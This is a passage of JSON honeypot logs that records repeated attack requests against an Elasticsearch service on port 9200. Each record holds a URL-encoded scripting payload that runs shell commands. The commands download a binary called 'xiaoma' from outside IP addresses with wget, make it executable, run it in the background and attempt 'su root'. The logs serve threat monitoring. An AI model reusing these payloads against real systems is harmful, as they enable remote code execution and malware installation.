    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget%20-O%20%2Ftmp%2Fxiaoma%20http%3A%2F%2F222.186.15.246%3A8080%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget+-O+%2Ftmp%2Fxiaoma+http%3A%2F%2F222.186.15.246%3A8080%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:39:15.725466234Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod%20777%20%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod+777+%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:39:21.146246577Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22nohup%20%2Ftmp%2Fxiaoma%20%3E%20%2Fdev%2Fnull%202%3E%261%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22nohup+%2Ftmp%2Fxiaoma+%3E+%2Fdev%2Fnull+2%3E%261%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:39:26.563345197Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:39:33.414542392Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22.%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22.%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:39:38.84081409Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget%20-O%20%2Ftmp%2Fxiaoma%20http%3A%2F%2F222.186.31.83%3A8080%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget+-O+%2Ftmp%2Fxiaoma+http%3A%2F%2F222.186.31.83%3A8080%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:39:44.250872136Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod%20777%20%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod+777+%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:39:49.63171884Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22nohup%20%2Ftmp%2Fxiaoma%20%3E%20%2Fdev%2Fnull%202%3E%261%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22nohup+%2Ftmp%2Fxiaoma+%3E+%2Fdev%2Fnull+2%3E%261%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:39:55.037354006Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:40:00.427246308Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22.%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22.%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:40:05.848906991Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget%20-O%20%2Ftmp%2Fxiaoma%20http%3A%2F%2F222.186.15.246%3A8080%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget+-O+%2Ftmp%2Fxiaoma+http%3A%2F%2F222.186.15.246%3A8080%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:40:11.896248897Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22su%20root%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22su+root%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:40:17.308357459Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod%20777%20%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod+777+%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:40:22.713996423Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22nohup%20%2Ftmp%2Fxiaoma%20%3E%20%2Fdev%2Fnull%202%3E%261%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22nohup+%2Ftmp%2Fxiaoma+%3E+%2Fdev%2Fnull+2%3E%261%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:40:28.107445357Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
